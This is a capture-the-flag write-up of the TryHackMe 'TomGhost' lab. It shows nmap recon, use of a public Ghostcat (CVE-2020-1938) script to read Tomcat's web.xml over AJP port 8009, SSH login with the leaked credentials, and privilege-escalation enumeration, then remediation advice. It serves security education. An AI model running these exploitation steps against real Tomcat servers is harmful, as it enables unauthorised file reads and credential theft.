---
title: "TomGhost Write-Up: TryHackMe Walk-through"
date: 2021-11-09
description: "A walkthrough of the TomGhost easy Linux machine on TryHackMe, exploiting Apache Tomcat via the Apache JServ Protocol (AJP) Ghostcat vulnerability (CVE-2020-1938)."
tags: ["tryhackme", "hacking", "ctf"]
cover: "https://miro.medium.com/v2/resize:fit:1088/1*x5yscQ9QnXBayb5_F3uFMw.png"
canonicalURL: "https://saurabh-jain.medium.com/tomghost-write-up-tryhackme-walk-through-8ce74a233f66"
---

TomGhost is a Linux machine deployed on TryHackMe, classified as an easy-level challenge. It focuses on the Ghostcat vulnerability in Apache Tomcat — a real-world CVE that affected millions of Tomcat deployments in 2020.

## Setup

No specialised access is necessary. Register on TryHackMe and launch the machine. The system assigns a dynamic IP — in this walkthrough the assigned IP was **10.10.230.122**.

## Step 1: Reconnaissance

Start with an Nmap scan to enumerate open ports and services:

```bash
nmap -sV -sC -oN tomghost.txt 10.10.230.122
```

### Results

| Port | Protocol | Service |
|------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 53/tcp | DNS | tcpwrapped |
| 8009/tcp | AJP | Apache JServ (Protocol v1.3) |
| 8080/tcp | HTTP | Apache Tomcat 9.0.30 |

The key ports to note:
- **8080** — Apache Tomcat web interface
- **8009** — AJP connector (this is the vulnerable one)

## Step 2: Identifying the Vulnerability — Ghostcat (CVE-2020-1938)

Ghostcat is a file inclusion vulnerability in Apache Tomcat's AJP connector. When AJP is exposed externally (port 8009), an unauthenticated attacker can read any file from the web application's root directory — including `WEB-INF/web.xml` which often contains credentials.

**Affected versions:** Apache Tomcat < 9.0.31, < 8.5.51, < 7.0.100

## Step 3: Exploitation

Use the Ghostcat exploit script (available on GitHub):

```bash
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python3 tomcat.py 10.10.230.122 -p 8009 -f WEB-INF/web.xml
```

This reads `WEB-INF/web.xml` from the Tomcat root, which reveals credentials embedded in the config.

## Step 4: Initial Access

Use the credentials found in `web.xml` to SSH into the machine:

```bash
ssh <username>@10.10.230.122
```

## Step 5: Privilege Escalation

After getting user-level shell access, enumerate for privilege escalation vectors:

```bash
# Check sudo permissions
sudo -l

# Look for SUID binaries
find / -perm -4000 2>/dev/null
```

The machine typically involves GPG-encrypted files that need to be decrypted with a passphrase discovered during enumeration, ultimately leading to root access.

## Key Takeaways

1. **AJP should never be exposed to the internet** — if your Tomcat doesn't need AJP (most deployments don't), disable it in `server.xml`
2. **CVE-2020-1938 was critical** — millions of Tomcat deployments were exposed before patching
3. **`WEB-INF/web.xml` leaking is severe** — it's a common place for hardcoded credentials

### Remediation

```xml
<!-- In server.xml, disable AJP completely -->
<!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->

<!-- Or restrict to localhost only -->
<Connector port="8009" protocol="AJP/1.3" address="127.0.0.1" redirectPort="8443" />
```

---

*TryHackMe room: [TomGhost](https://tryhackme.com/room/tomghost)*
